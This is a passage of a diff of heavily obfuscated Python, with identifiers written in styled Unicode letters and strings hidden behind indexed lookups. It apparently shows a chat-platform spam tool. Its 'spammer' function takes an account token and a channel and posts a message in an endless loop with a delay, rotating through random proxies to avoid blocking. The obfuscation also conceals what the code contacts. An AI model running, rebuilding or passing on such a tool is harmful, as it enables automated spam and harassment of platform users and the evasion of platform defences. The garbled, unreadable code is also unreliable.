𝗹𝙈𝘔𝘕𝙡𝗜𝘔𝙄𝘐𝙉𝘔𝙄𝗜𝗠𝗜𝗹𝙄𝘕𝘐𝗠𝗜𝗜𝘔[275]}{𝗿}{𝙉𝗠𝗠𝗠𝙉𝘭𝙡𝘔𝘔𝘭𝗠𝙈𝙉𝗹𝗜𝗠𝗜𝘐𝘕𝙈𝗜𝙄𝗠𝘐𝙡𝗜𝙉𝗜𝙈𝘐𝗜𝘔[100]}{𝘯𝘯}{𝙜}{𝗡𝗠𝗠𝙈𝙉𝙡𝗹𝗠𝗠𝗹𝗠𝙈𝙉𝘭𝗜𝗠𝙄𝙄𝗡𝘔𝗜𝗜𝘔𝙄𝗹𝘐𝘕𝙄𝗠𝙄𝙄𝗠[256]}")
-        elif 𝗿𝙧.status_code == 403:
-            𝗽𝙧𝘪𝘯𝙩(f"{𝙧}{𝗡𝘔𝘔𝙈𝘕𝗹𝙡𝙈𝗠𝙡𝘔𝗠𝙉𝗹𝙄𝗠𝙄𝘐𝗡𝙈𝗜𝗜𝗠𝗜𝘭𝘐𝙉𝙄𝘔𝗜𝗜𝙈[98]}{𝘥𝙖𝘵𝘦𝘵𝙞𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝗡𝘔𝗠𝗠𝗡𝘭𝘭𝘔𝘔𝙡𝙈𝙈𝗡𝗹𝗜𝙈𝙄𝗜𝗡𝘔𝘐𝘐𝙈𝗜𝙡𝘐𝙉𝘐𝗠𝙄𝗜𝘔[99]}{𝗿}')}{𝙉𝗠𝘔𝙈𝙉𝙡𝗹𝘔𝘔𝗹𝙈𝘔𝘕𝘭𝘐𝘔𝙄𝙄𝙉𝗠𝙄𝗜𝗠𝘐𝘭𝗜𝘕𝙄𝘔𝘐𝙄𝘔[100]}{𝗿}{𝗡𝘔𝘔𝙈𝘕𝘭𝗹𝗠𝘔𝘭𝙈𝙈𝙉𝙡𝗜𝘔𝗜𝗜𝙉𝗠𝘐𝘐𝘔𝘐𝗹𝙄𝙉𝙄𝘔𝗜𝘐𝗠[98]}{𝗯}{𝘕𝙈𝘔𝙈𝙉𝙡𝙡𝙈𝘔𝘭𝗠𝗠𝗡𝗹𝗜𝙈𝘐𝙄𝘕𝗠𝙄𝘐𝗠𝙄𝙡𝘐𝗡𝗜𝙈𝘐𝙄𝗠[276]}{𝙧}{𝗡𝙈𝘔𝗠𝗡𝘭𝗹𝙈𝘔𝘭𝘔𝘔𝘕𝗹𝘐𝙈𝙄𝗜𝘕𝘔𝙄𝗜𝗠𝗜𝘭𝗜𝗡𝙄𝘔𝘐𝘐𝗠[100]}{𝗻𝙣}{𝗴}{𝗡𝗠𝘔𝗠𝘕𝗹𝙡𝙈𝗠𝙡𝙈𝘔𝙉𝘭𝘐𝘔𝙄𝗜𝗡𝙈𝘐𝗜𝗠𝘐𝙡𝗜𝗡𝗜𝗠𝗜𝘐𝗠[277]}{𝘳𝘳.text}")
+            𝙧𝗿 = 𝘳𝗲𝗾𝘂𝗲𝘴𝘵𝘀.post(f'{𝗜𝗡𝘐𝙉𝘭𝙡𝙄𝙈𝙄𝙄𝘭𝙈𝘭𝘭𝗜𝗹𝘭𝙉𝙉𝘐𝗹𝙡𝘔𝘕𝙡𝘕𝗹𝙈𝘐𝘔𝘐𝗠[266]}{𝙘𝙝𝗮𝘯𝗻𝙚𝗹}{𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝗠𝗜𝗜𝘭𝗠𝙡𝗹𝗜𝙡𝙡𝘕𝗡𝗜𝘭𝘭𝙈𝘕𝗹𝘕𝗹𝘔𝙄𝘔𝙄𝗠[267]}', headers=𝙝𝗲𝙖𝙙𝗲𝙧𝙨, json=𝗱𝘢𝘁𝗮)
+        if 𝗿𝙧.status_code == 200:
+            𝘱𝗿𝙞𝗻𝘵(f"{𝘳}{𝘐𝘕𝙄𝗡𝗹𝗹𝘐𝘔𝗜𝙄𝙡𝘔𝘭𝙡𝙄𝙡𝙡𝙉𝗡𝗜𝙡𝘭𝘔𝙉𝗹𝗡𝘭𝘔𝘐𝘔𝘐𝙈[91]}{𝘥𝘢𝙩𝘦𝘵𝗶𝘮𝗲.datetime.now().strftime(f'{𝘨}{𝗜𝗡𝘐𝙉𝘭𝙡𝗜𝘔𝗜𝙄𝘭𝘔𝘭𝗹𝙄𝘭𝗹𝘕𝘕𝘐𝘭𝗹𝙈𝙉𝗹𝘕𝘭𝘔𝙄𝘔𝗜𝗠[92]}{𝙧}')}{𝙄𝙉𝙄𝘕𝗹𝘭𝘐𝗠𝘐𝘐𝗹𝗠𝗹𝘭𝘐𝘭𝘭𝗡𝗡𝙄𝗹𝙡𝗠𝗡𝙡𝗡𝙡𝙈𝘐𝘔𝘐𝗠[93]}{𝘳}{𝗜𝙉𝘐𝗡𝙡𝗹𝙄𝘔𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝗹𝘭𝘕𝘕𝘐𝙡𝙡𝙈𝗡𝗹𝙉𝘭𝙈𝘐𝗠𝙄𝙈[91]}{𝗹𝘤}{𝘐𝙉𝗜𝗡𝗹𝗹𝘐𝘔𝙄𝘐𝗹𝗠𝙡𝘭𝘐𝙡𝙡𝗡𝗡𝗜𝘭𝗹𝘔𝙉𝗹𝘕𝘭𝘔𝗜𝘔𝙄𝘔[268]}{𝙧}{𝗜𝘕𝗜𝘕𝗹𝗹𝘐𝗠𝙄𝙄𝗹𝗠𝙡𝗹𝙄𝙡𝗹𝙉𝙉𝗜𝗹𝙡𝙈𝗡𝗹𝙉𝘭𝙈𝗜𝗠𝗜𝙈[93]}{𝘯𝙣}{𝙜}{𝗜𝘕𝙄𝗡𝘭𝗹𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝗹𝗜𝗹𝗹𝙉𝙉𝘐𝘭𝘭𝗠𝗡𝗹𝘕𝘭𝗠𝗜𝙈𝗜𝗠[249]}")
+        elif 𝙧𝙧.status_code == 403:
+            𝘱𝘳𝙞𝗻𝘁(f"{𝙧}{𝘐𝘕𝘐𝙉𝘭𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝗹𝙡𝙄𝙡𝗹𝗡𝘕𝗜𝘭𝙡𝙈𝘕𝗹𝗡𝙡𝘔𝗜𝗠𝘐𝗠[91]}{𝙙𝘢𝙩𝙚𝘵𝗶𝙢𝙚.datetime.now().strftime(f'{𝙜}{𝘐𝘕𝘐𝗡𝗹𝗹𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝙡𝘐𝙡𝙡𝙉𝘕𝙄𝙡𝗹𝗠𝗡𝘭𝗡𝙡𝗠𝗜𝗠𝙄𝙈[92]}{𝘳}')}{𝗜𝘕𝙄𝙉𝘭𝙡𝙄𝙈𝗜𝙄𝗹𝗠𝗹𝙡𝘐𝙡𝘭𝙉𝙉𝗜𝘭𝗹𝗠𝗡𝙡𝘕𝗹𝗠𝘐𝙈𝙄𝘔[93]}{𝘳}{𝙄𝗡𝙄𝙉𝘭𝗹𝗜𝘔𝘐𝙄𝗹𝙈𝘭𝙡𝘐𝗹𝗹𝗡𝗡𝙄𝙡𝗹𝙈𝙉𝗹𝘕𝘭𝗠𝘐𝘔𝘐𝙈[91]}{𝗯}{𝘐𝗡𝘐𝙉𝘭𝘭𝘐𝘔𝗜𝗜𝘭𝙈𝗹𝗹𝙄𝙡𝘭𝗡𝙉𝗜𝙡𝘭𝙈𝘕𝗹𝘕𝗹𝙈𝘐𝙈𝘐𝗠[269]}{𝙧}{𝗜𝘕𝗜𝘕𝘭𝙡𝙄𝙈𝙄𝙄𝙡𝗠𝙡𝙡𝗜𝙡𝘭𝙉𝙉𝗜𝗹𝗹𝗠𝘕𝘭𝘕𝙡𝗠𝘐𝘔𝙄𝙈[93]}{𝙣𝘯}{𝘨}{𝗜𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝗜𝙄𝙡𝗠𝗹𝘭𝘐𝙡𝗹𝗡𝘕𝗜𝗹𝘭𝘔𝗡𝙡𝙉𝙡𝗠𝗜𝘔𝗜𝗠[270]}{𝙧𝗿.text}")
             return
         else:
-            𝙥𝘳𝗶𝗻𝘵(f"{𝙧}{𝙉𝘔𝙈𝘔𝘕𝙡𝘭𝙈𝙈𝘭𝘔𝘔𝗡𝙡𝙄𝗠𝗜𝙄𝗡𝗠𝗜𝘐𝘔𝙄𝘭𝘐𝘕𝙄𝙈𝙄𝘐𝙈[98]}{𝘥𝙖𝘵𝘦𝘵𝙞𝙢𝗲.datetime.now().strftime(f'{𝘨}{𝙉𝗠𝘔𝘔𝙉𝗹𝙡𝘔𝘔𝘭𝗠𝙈𝙉𝘭𝙄𝗠𝘐𝗜𝗡𝘔𝙄𝗜𝗠𝙄𝘭𝘐𝗡𝘐𝗠𝗜𝘐𝗠[99]}{𝘳}')}{𝗡𝘔𝗠𝙈𝗡𝘭𝙡𝘔𝙈𝙡𝗠𝘔𝘕𝘭𝗜𝙈𝗜𝘐𝘕𝙈𝙄𝗜𝙈𝙄𝘭𝘐𝙉𝘐𝙈𝘐𝘐𝘔[100]}{𝗿}{𝘕𝘔𝗠𝘔𝙉𝗹𝘭𝙈𝗠𝙡𝙈𝘔𝗡𝘭𝗜𝗠𝗜𝗜𝘕𝗠𝘐𝗜𝙈𝗜𝘭𝘐𝙉𝘐𝙈𝙄𝗜𝗠[98]}{𝙗}{𝗡𝘔𝗠𝗠𝙉𝙡𝗹𝗠𝙈𝘭𝘔𝗠𝗡𝙡𝙄𝗠𝘐𝗜𝗡𝘔𝘐𝘐𝙈𝗜𝙡𝗜𝘕𝙄𝗠𝙄𝗜𝗠[276]}{𝘳}{𝘕𝙈𝙈𝙈𝗡𝗹𝙡𝙈𝗠𝘭𝘔𝘔𝗡𝗹𝘐𝙈𝘐𝙄𝗡𝙈𝙄𝙄𝗠𝗜𝘭𝗜𝘕𝘐𝘔𝘐𝗜𝙈[100]}{𝙣𝗻}{𝗴}{𝗡𝗠𝘔𝙈𝗡𝘭𝗹𝘔𝗠𝘭𝗠𝙈𝘕𝙡𝘐𝘔𝗜𝗜𝘕𝘔𝗜𝘐𝘔𝗜𝙡𝗜𝘕𝘐𝗠𝙄𝗜𝙈[277]}{𝘳𝗿.text}")
+            𝘱𝘳𝘪𝙣𝘁(f"{𝗿}{𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝘔𝗜𝙄𝙡𝗠𝘭𝘭𝘐𝙡𝙡𝗡𝙉𝗜𝙡𝗹𝗠𝙉𝙡𝙉𝗹𝗠𝘐𝗠𝘐𝗠[91]}{𝙙𝙖𝘁𝘦𝘵𝙞𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝙄𝙉𝗜𝗡𝘭𝘭𝗜𝙈𝙄𝘐𝘭𝙈𝘭𝘭𝗜𝗹𝙡𝗡𝘕𝗜𝙡𝙡𝗠𝗡𝘭𝗡𝙡𝗠𝗜𝘔𝘐𝘔[92]}{𝙧}')}{𝙄𝘕𝘐𝘕𝗹𝗹𝙄𝗠𝘐𝘐𝙡𝘔𝗹𝗹𝙄𝗹𝘭𝙉𝙉𝙄𝗹𝙡𝗠𝙉𝙡𝙉𝗹𝗠𝙄𝗠𝙄𝗠[93]}{𝙧}{𝙄𝙉𝘐𝗡𝘭𝗹𝙄𝗠𝙄𝘐𝙡𝘔𝗹𝙡𝙄𝙡𝙡𝙉𝘕𝘐𝙡𝘭𝘔𝗡𝗹𝗡𝘭𝘔𝗜𝘔𝘐𝙈[91]}{𝗯}{𝘐𝘕𝘐𝗡𝗹𝘭𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝗹𝗜𝙡𝙡𝗡𝗡𝗜𝙡𝗹𝗠𝙉𝙡𝗡𝙡𝘔𝙄𝘔𝗜𝙈[269]}{𝗿}{𝗜𝙉𝙄𝘕𝗹𝙡𝘐𝗠𝘐𝙄𝙡𝗠𝗹𝘭𝗜𝘭𝘭𝗡𝙉𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝗹𝗠𝙄𝙈𝘐𝗠[93]}{𝘯𝘯}{𝘨}{𝙄𝗡𝙄𝘕𝗹𝗹𝘐𝙈𝙄𝗜𝗹𝗠𝘭𝘭𝘐𝗹𝘭𝙉𝘕𝘐𝙡𝗹𝙈𝘕𝙡𝗡𝘭𝙈𝘐𝙈𝗜𝘔[270]}{𝘳𝘳.text}")
 
 def spammer(token, channel, message, delay):
-    𝘩𝙚𝘢𝘥𝗲𝙧𝙨 = 𝙃𝘦𝗮𝘥𝘦𝗿𝘀(𝘁𝙤𝙠𝘦𝙣)
+    𝘩𝙚𝙖𝗱𝘦𝗿𝙨 = 𝙃𝘦𝙖𝙙𝗲𝗿𝘴(𝘁𝙤𝙠𝙚𝘯)
     while True:
-        𝘥𝙣 = 𝘁𝙤𝗸𝙚𝗻.split(𝙉𝘔𝗠𝘔𝘕𝘭𝘭𝙈𝙈𝘭𝙈𝘔𝗡𝙡𝘐𝗠𝙄𝙄𝘕𝙈𝙄𝙄𝙈𝙄𝙡𝘐𝗡𝗜𝙈𝙄𝙄𝘔[254])
-        𝙣𝘯 = 𝘥𝘯[0]
-        𝙙𝘢𝘁𝗮 = {𝙉𝙈𝙈𝗠𝘕𝘭𝗹𝙈𝘔𝘭𝗠𝗠𝗡𝘭𝙄𝘔𝙄𝗜𝙉𝗠𝙄𝗜𝘔𝘐𝘭𝗜𝗡𝙄𝘔𝘐𝙄𝘔[272]: 𝙢𝙚𝙨𝙨𝙖𝗴𝘦}
-        𝙨𝙡𝙚𝙚𝙥(𝙙𝙚𝙡𝗮𝙮)
-        if 𝙥𝘳𝘰𝘹𝙮:
-            𝘳𝘳 = 𝘳𝗲𝘲𝙪𝘦𝘴𝙩𝘀.post(f'{𝙉𝘔𝙈𝘔𝘕𝙡𝙡𝙈𝘔𝗹𝗠𝙈𝘕𝙡𝙄𝗠𝗜𝗜𝘕𝙈𝘐𝗜𝘔𝙄𝙡𝙄𝘕𝗜𝙈𝗜𝗜𝙈[273]}{𝙘𝘩𝗮𝙣𝘯𝘦𝘭}{𝘕𝘔𝘔𝙈𝗡𝙡𝘭𝙈𝙈𝙡𝗠𝗠𝘕𝙡𝙄𝗠𝙄𝘐𝙉𝘔𝗜𝗜𝙈𝗜𝗹𝗜𝘕𝙄𝗠𝙄𝘐𝘔[274]}', headers=𝗵𝗲𝗮𝘥𝗲𝘳𝙨, json=𝙙𝗮𝘁𝗮, proxy={𝘕𝗠𝙈𝘔𝘕𝗹𝙡𝘔𝙈𝘭𝗠𝘔𝘕𝘭𝙄𝙈𝙄𝗜𝗡𝙈𝘐𝙄𝗠𝙄𝗹𝙄𝘕𝘐𝘔𝘐𝙄𝘔[251]: 𝘕𝙈𝘔𝗠𝘕𝗹𝙡𝘔𝗠𝘭𝙈𝘔𝘕𝗹𝘐𝘔𝘐𝗜𝘕𝘔𝙄𝗜𝘔𝘐𝘭𝙄𝘕𝗜𝗠𝙄𝙄𝗠[253] + 𝗿𝙖𝗻𝗱𝘰𝘮.choice(𝗽𝙧𝗼𝙭𝗶𝗲𝘴), 𝗡𝗠𝘔𝘔𝘕𝙡𝘭𝗠𝙈𝘭𝙈𝙈𝘕𝘭𝙄𝙈𝗜𝗜𝘕𝘔𝘐𝙄𝙈𝘐𝘭𝘐𝙉𝙄𝙈𝗜𝗜𝙈[252]: 𝙉𝘔𝘔𝗠𝘕𝙡𝘭𝗠𝙈𝘭𝘔𝘔𝘕𝙡𝙄𝗠𝗜𝘐𝙉𝗠𝘐𝘐𝙈𝗜𝙡𝘐𝗡𝙄𝙈𝗜𝙄𝙈[253] + 𝙧𝗮𝙣𝘥𝘰𝘮.choice(𝘱𝙧𝙤𝙭𝘪𝗲𝘀)})
+        𝘥𝙣 = 𝙩𝘰𝙠𝘦𝗻.split(𝗜𝘕𝗜𝙉𝘭𝘭𝙄𝘔𝗜𝘐𝙡𝘔𝘭𝗹𝗜𝗹𝘭𝙉𝗡𝙄𝙡𝗹𝘔𝘕𝘭𝗡𝘭𝗠𝙄𝗠𝘐𝙈[247])
+        𝙣𝘯 = 𝘥𝗻[0]
+        𝘥𝗮𝘵𝘢 = {𝙄𝙉𝘐𝙉𝙡𝗹𝘐𝗠𝙄𝗜𝗹𝙈𝗹𝗹𝙄𝗹𝙡𝗡𝗡𝗜𝙡𝗹𝘔𝙉𝙡𝗡𝙡𝗠𝗜𝙈𝗜𝘔[265]: 𝘮𝘦𝙨𝙨𝗮𝙜𝗲}
+        𝙨𝘭𝙚𝙚𝗽(𝗱𝙚𝗹𝙖𝘆)
+        if 𝘱𝗿𝙤𝙭𝘺:
+            𝗿𝙧 = 𝙧𝘦𝗾𝘂𝘦𝘀𝙩𝙨.post(f'{𝗜𝘕𝘐𝙉𝙡𝗹𝙄𝘔𝗜𝙄𝗹𝘔𝗹𝗹𝙄𝘭𝙡𝙉𝙉𝘐𝙡𝗹𝙈𝘕𝙡𝘕𝘭𝘔𝙄𝗠𝙄𝘔[266]}{𝘤𝘩𝙖𝘯𝙣𝗲𝘭}{𝙄𝘕𝗜𝙉𝘭𝙡𝘐𝙈𝙄𝘐𝗹𝘔𝙡𝗹𝙄𝘭𝘭𝘕𝙉𝙄𝘭𝙡𝗠𝙉𝘭𝙉𝙡𝘔𝘐𝘔𝘐𝗠[267]}', headers=𝘩𝗲𝘢𝘥𝘦𝗿𝘴, json=𝙙𝘢𝙩𝙖, proxy={𝘐𝘕𝘐𝗡𝗹𝘭𝗜𝘔𝘐𝘐𝙡𝘔𝘭𝙡𝘐𝗹𝙡𝗡𝗡𝙄𝘭𝙡𝙈𝙉𝙡𝙉𝗹𝗠𝗜𝘔𝘐𝘔[244]: 𝙄𝗡𝘐𝙉𝗹𝙡𝘐𝙈𝙄𝙄𝗹𝙈𝘭𝙡𝗜𝘭𝙡𝙉𝗡𝙄𝗹𝙡𝘔𝘕𝙡𝗡𝙡𝗠𝙄𝗠𝙄𝙈[246] + 𝘳𝘢𝘯𝙙𝘰𝘮.choice(𝘱𝘳𝗼𝘹𝙞𝗲𝘀), 𝘐𝗡𝘐𝘕𝙡𝘭𝘐𝙈𝘐𝘐𝗹𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝗡𝘭𝘕𝗹𝘔𝘐𝘔𝗜𝘔[245]: 𝙄𝘕𝗜𝙉𝗹𝙡𝘐𝘔𝗜𝘐𝙡𝙈𝗹𝘭𝗜𝘭𝗹𝘕𝘕𝙄𝘭𝗹𝘔𝗡𝙡𝗡𝙡𝗠𝘐𝘔𝘐𝗠[246] + 𝘳𝗮𝗻𝗱𝙤𝘮.choice(𝙥𝙧𝘰𝙭𝙞𝘦𝙨)})
         else:
-            𝙧𝗿 = 𝗿𝙚𝙦𝘂𝘦𝘀𝘁𝘴.post(f'{𝗡𝙈𝙈𝙈𝘕𝘭𝗹𝙈𝙈𝘭𝘔𝙈𝙉𝗹𝗜𝘔𝘐𝘐𝘕𝙈𝘐𝘐𝙈𝙄𝘭𝘐𝘕𝗜𝘔𝗜𝗜𝘔[273]}{𝗰𝘩𝘢𝙣𝗻𝗲𝘭}{𝘕𝗠𝙈𝙈𝙉𝘭𝙡𝙈𝙈𝗹𝘔𝘔𝙉𝘭𝗜𝗠𝘐𝙄𝙉𝘔𝙄𝗜𝙈𝘐𝙡𝘐𝗡𝗜𝘔𝘐𝘐𝙈[274]}', headers=𝗵𝘦𝙖𝘥𝙚𝗿𝙨, json=𝗱𝗮𝙩𝙖)
-        if 𝗿𝗿.status_code == 200:
-            𝙥𝘳𝘪𝘯𝘵(f"{𝗿}{𝘕𝘔𝗠𝘔𝙉𝗹𝗹𝙈𝙈𝙡𝘔𝘔𝗡𝗹𝗜𝙈𝘐𝘐𝙉𝙈𝗜𝙄𝙈𝗜𝗹𝗜𝘕𝘐𝗠𝘐𝙄𝘔[98]}{𝗱𝙖𝘵𝙚𝘁𝙞𝙢𝗲.datetime.now().strftime(f'{𝗴}{𝘕𝘔𝘔𝘔𝙉𝗹𝘭𝙈𝙈𝗹𝘔𝙈𝘕𝗹𝘐𝘔𝙄𝗜𝗡𝘔𝙄𝗜𝗠𝗜𝘭𝘐𝗡𝙄𝙈𝙄𝙄𝗠[99]}{𝗿}')}{𝙉𝘔𝗠𝘔𝙉𝙡𝗹𝗠𝘔𝙡𝗠𝘔𝙉𝗹𝙄𝘔𝗜𝘐𝘕𝘔𝘐𝗜𝘔𝙄𝘭𝙄𝙉𝘐𝘔𝙄𝘐𝘔[100]}{𝗿}{𝗡𝙈𝘔𝘔𝙉𝙡𝙡𝙈𝗠𝘭𝘔𝘔𝘕𝘭𝗜𝘔𝘐𝙄𝘕𝘔𝙄𝘐𝗠𝗜𝗹𝗜𝘕𝗜𝙈𝘐𝘐𝘔[98]}{𝙡𝗰}{𝙉𝙈𝘔𝘔𝙉𝘭𝙡𝙈𝘔𝗹𝘔𝘔𝗡𝘭𝘐𝙈𝘐𝘐𝗡𝘔𝙄𝘐𝙈𝘐𝙡𝗜𝗡𝙄𝗠𝗜𝘐𝘔[275]}{𝙧}{𝗡𝘔𝗠𝘔𝙉𝗹𝗹𝘔𝘔𝙡𝙈𝗠𝙉𝗹𝘐𝙈𝗜𝘐𝗡𝙈𝘐𝙄𝘔𝗜𝙡𝗜𝘕𝙄𝙈𝗜𝘐𝙈[100]}{𝘯𝘯}{𝗴}{𝙉𝗠𝙈𝙈𝗡𝙡𝙡𝙈𝙈𝗹𝘔𝙈𝙉𝘭𝘐𝙈𝙄𝘐𝙉𝗠𝙄𝘐𝘔𝙄𝘭𝙄𝘕𝗜𝗠𝗜𝘐𝘔[256]}")
-        elif 𝙧𝘳.status_code == 403:
-            𝗽𝗿𝙞𝗻𝙩(f"{𝙧}{𝗡𝙈𝙈𝘔𝙉𝙡𝙡𝘔𝗠𝘭𝘔𝗠𝘕𝘭𝙄𝘔𝘐𝙄𝘕𝘔𝙄𝘐𝗠𝗜𝙡𝗜𝗡𝙄𝘔𝘐𝙄𝗠[98]}{𝘥𝗮𝙩𝗲𝘁𝘪𝗺𝘦.datetime.now().strftime(f'{𝙜}{𝙉𝙈𝙈𝗠𝗡𝘭𝙡𝘔𝗠𝙡𝗠𝘔𝙉𝘭𝙄𝗠𝗜𝙄𝘕𝘔𝘐𝗜𝗠𝘐𝘭𝘐𝘕𝘐𝘔𝙄𝘐𝙈[99]}{𝗿}')}{𝗡𝙈𝗠𝘔𝘕𝙡𝗹𝗠𝘔𝙡𝘔𝗠𝘕𝙡𝙄𝙈𝗜𝘐𝘕𝘔𝘐𝘐𝙈𝙄𝗹𝙄𝗡𝘐𝗠𝘐𝘐𝗠[100]}{𝙧}{𝘕𝗠𝗠𝙈𝗡𝙡𝙡𝙈𝙈𝘭𝗠𝙈𝘕𝘭𝗜𝙈𝗜𝙄𝘕𝗠𝙄𝘐𝙈𝙄𝙡𝗜𝗡𝗜𝘔𝘐𝗜𝘔[98]}{𝙗}{𝙉𝘔𝙈𝗠𝘕𝘭𝘭𝗠𝗠𝙡𝙈𝗠𝗡𝗹𝘐𝗠𝘐𝘐𝗡𝙈𝙄𝘐𝘔𝙄𝙡𝘐𝗡𝗜𝗠𝙄𝘐𝗠[276]}{𝙧}{𝘕𝗠𝗠𝙈𝗡𝘭𝗹𝗠𝙈𝘭𝗠𝘔𝘕𝘭𝙄𝗠𝙄𝙄𝗡𝗠𝙄𝘐𝙈𝙄𝗹𝘐𝙉𝙄𝙈𝗜𝗜𝗠[100]}{𝗻𝗻}{𝘨}{𝗡𝙈𝙈𝘔𝘕𝙡𝘭𝙈𝙈𝗹𝗠𝗠𝘕𝗹𝙄𝙈𝙄𝙄𝘕𝙈𝘐𝘐𝙈𝗜𝙡𝗜𝗡𝗜𝘔𝙄𝙄𝗠[277]}{𝙧𝙧.text}")
+            𝘳𝘳 = 𝘳𝙚𝘲𝘶𝘦𝘴𝙩𝘀.post(f'{𝘐𝘕𝘐𝘕𝙡𝘭𝙄𝙈𝗜𝘐𝘭𝘔𝘭𝙡𝗜𝘭𝗹𝙉𝗡𝘐𝘭𝗹𝗠𝘕𝗹𝗡𝗹𝘔𝘐𝘔𝙄𝘔[266]}{𝗰𝙝𝘢𝗻𝙣𝘦𝘭}{𝙄𝗡𝙄𝗡𝙡𝘭𝘐𝙈𝗜𝙄𝙡𝘔𝗹𝘭𝘐𝘭𝘭𝙉𝗡𝘐𝙡𝘭𝙈𝙉𝙡𝙉𝘭𝘔𝘐𝙈𝗜𝗠[267]}', headers=𝗵𝗲𝗮𝘥𝗲𝙧𝘴, json=𝗱𝗮𝙩𝙖)
+        if 𝙧𝗿.status_code == 200:
+            𝘱𝘳𝗶𝘯𝙩(f"{𝗿}{𝗜𝗡𝗜𝘕𝘭𝗹𝘐𝘔𝗜𝘐𝗹𝗠𝘭𝙡𝗜𝙡𝗹𝗡𝙉𝙄𝗹𝙡𝘔𝗡𝘭𝗡𝘭𝗠𝗜𝗠𝙄𝘔[91]}{𝙙𝘢𝘵𝘦𝙩𝙞𝙢𝗲.datetime.now().strftime(f'{𝗴}{𝘐𝘕𝗜𝙉𝘭𝙡𝘐𝙈𝘐𝙄𝗹𝙈𝗹𝙡𝘐𝘭𝙡𝘕𝗡𝙄𝘭𝘭𝗠𝗡𝘭𝙉𝘭𝘔𝘐𝘔𝘐𝗠[92]}{𝗿}')}{𝗜𝗡𝘐𝗡𝘭𝗹𝙄𝘔𝗜𝗜𝗹𝙈𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝗜𝗹𝙡𝘔𝗡𝙡𝗡𝗹𝘔𝗜𝙈𝘐𝙈[93]}{𝗿}{𝙄𝗡𝙄𝗡𝘭𝘭𝗜𝘔𝘐𝙄𝙡𝙈𝙡𝘭𝙄𝙡𝗹𝘕𝙉𝘐𝘭𝙡𝘔𝘕𝙡𝗡𝘭𝙈𝙄𝘔𝘐𝗠[91]}{𝗹𝙘}{𝗜𝗡𝗜𝙉𝘭𝙡𝙄𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝙄𝗹𝘭𝙉𝗡𝗜𝙡𝘭𝘔𝙉𝘭𝙉𝗹𝗠𝘐𝘔𝗜𝘔[268]}{𝘳}{𝗜𝘕𝗜𝘕𝗹𝙡𝘐𝙈𝗜𝙄𝗹𝗠𝘭𝙡𝗜𝙡𝘭𝗡𝙉𝙄𝙡𝗹𝗠𝘕𝙡𝗡𝗹𝙈𝙄𝘔𝙄𝘔[93]}{𝗻𝘯}{𝙜}{𝙄𝗡𝘐𝗡𝘭𝘭𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝘐𝘭𝙡𝙉𝗡𝘐𝙡𝗹𝙈𝗡𝗹𝗡𝘭𝘔𝘐𝘔𝗜𝗠[249]}")
+        elif 𝘳𝗿.status_code == 403:
+            𝗽𝘳𝘪𝘯𝙩(f"{𝙧}{𝘐𝗡𝗜𝘕𝗹𝗹𝗜𝗠𝗜𝘐𝗹𝙈𝗹𝘭𝙄𝙡𝙡𝙉𝗡𝙄𝘭𝙡𝙈𝘕𝘭𝙉𝘭𝗠𝗜𝘔𝗜𝘔[91]}{𝗱𝙖𝙩𝘦𝘁𝗶𝙢𝙚.datetime.now().strftime(f'{𝘨}{𝙄𝗡𝙄𝙉𝙡𝘭𝗜𝗠𝙄𝗜𝙡𝘔𝙡𝙡𝗜𝘭𝗹𝘕𝗡𝙄𝘭𝙡𝙈𝘕𝗹𝗡𝗹𝘔𝙄𝙈𝘐𝙈[92]}{𝙧}')}{𝘐𝙉𝙄𝗡𝘭𝘭𝙄𝗠𝘐𝘐𝘭𝘔𝗹𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝙡𝘭𝗠𝘕𝘭𝘕𝙡𝙈𝘐𝗠𝙄𝗠[93]}{𝗿}{𝘐𝘕𝘐𝙉𝗹𝗹𝘐𝙈𝗜𝘐𝗹𝗠𝘭𝗹𝙄𝙡𝘭𝘕𝘕𝘐𝘭𝙡𝗠𝙉𝗹𝗡𝘭𝙈𝙄𝗠𝘐𝘔[91]}{𝗯}{𝗜𝗡𝗜𝙉𝗹𝗹𝘐𝘔𝙄𝙄𝙡𝙈𝗹𝘭𝘐𝗹𝙡𝗡𝗡𝘐𝗹𝙡𝘔𝙉𝙡𝘕𝗹𝘔𝙄𝙈𝙄𝘔[269]}{𝙧}{𝙄𝙉𝗜𝙉𝘭𝙡𝗜𝘔𝘐𝗜𝘭𝗠𝗹𝗹𝘐𝗹𝘭𝙉𝗡𝙄𝘭𝘭𝗠𝘕𝗹𝗡𝘭𝘔𝘐𝙈𝗜𝙈[93]}{𝘯𝗻}{𝗴}{𝘐𝗡𝗜𝙉𝙡𝘭𝗜𝘔𝘐𝙄𝘭𝙈𝘭𝗹𝘐𝘭𝙡𝘕𝗡𝙄𝗹𝙡𝘔𝗡𝙡𝙉𝘭𝙈𝘐𝘔𝗜𝗠[270]}{𝙧𝗿.text}")
             return
         else:
